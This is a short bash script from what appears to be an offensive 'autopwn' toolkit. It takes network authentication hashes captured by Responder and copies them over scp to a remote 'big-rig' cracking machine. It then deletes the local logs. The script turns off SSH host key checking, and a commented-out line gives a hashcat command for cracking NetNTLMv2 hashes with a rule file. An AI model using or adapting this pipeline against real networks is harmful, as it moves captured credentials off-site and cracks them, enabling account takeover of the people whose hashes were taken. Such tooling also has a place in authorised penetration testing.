#!/bin/bash
#This section assumes you have a cracking rig (AKA big-rig for my team) already connected via VPN somewhere. 
#If you don't, you can run this locally or just comment it out

#This will grab all the responder hashes that incron picks up (in theory, ALL hashes), scps them to the big-rig cracking machine, and recommend hashcat


#BEfore we SCP them, we want to create a directory by day so they're not just all mixed in together

new_dir=/home/dispareo/autopwn/$(date +"%d-%m-%Y")

echo -e "${GREEN}creating ${new_dir}"
ssh -i /home/pi/.ssh/id_ed25519 -o StrictHostKeyChecking=no dispareo@big-rig "ls ${new_dir} || mkdir ${new_dir}"
scp -i /home/pi/.ssh/id_ed25519 /usr/share/responder/logs/${1} dispareo@big-rig:${new_dir} && rm -rf /usr/share/responder/logs/${1}
#Now that the file is copied over, crack it!

#So, maybe in the 3rd iteration, we will figure out how to add hashes to the "currently being cracked" list
#The problem is if we append the hashes, the new hashes will not be coimpared with  all of the previously attempted cracks. So - that's not going to work. Instead, we will store them all up and  
#ssh -o StrictHostKeyChecking=no -l dispareo big-rig "hashcat -m 5600 -a 0 autopwn_hashes -w 4 -r OneRuleToRuleThemStill.rule"
